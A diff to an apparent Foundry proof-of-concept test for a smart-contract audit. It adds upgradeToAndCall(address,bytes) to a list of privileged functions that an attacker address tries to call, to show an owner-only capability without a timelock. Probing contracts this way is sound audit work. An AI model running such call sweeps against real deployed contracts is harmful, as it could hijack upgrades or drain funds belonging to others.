@@ -114,6 +114,13 @@ contract PoC is Test {
             abi.encodeWithSignature("upgradeTo(address)", attacker)
         );
         if (bytes(used).length > 0) return used;
+        used = _attempt(
+            attacker,
+            before,
+            "upgradeToAndCall(address,bytes)",
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", attacker, bytes(""))
+        );
+        if (bytes(used).length > 0) return used;
         return "";
     }
 
@@ -129,7 +136,7 @@ contract PoC is Test {
 
         assertTrue(
             bytes(used).length > 0,
-            "not reproduced via any tried entry point. Candidates tried: withdraw(), withdrawAll(), sweep(), mint(address,uint256), setFee(uint256), pause(), burn(address), upgradeTo(address) -- each either RETURNED (a no-op) or left value/state unchanged. This does NOT establish safety: the privileged action may be under another name. Adapt the candidate list."
+            "not reproduced via any tried entry point. Candidates tried: withdraw(), withdrawAll(), sweep(), mint(address,uint256), setFee(uint256), pause(), burn(address), upgradeTo(address), upgradeToAndCall(address,bytes) -- each either RETURNED (a no-op) or left value/state unchanged. This does NOT establish safety: the privileged action may be under another name. Adapt the candidate list."
         );
         console.log("owner-only capability proven via", used, "-- no timelock");
     }
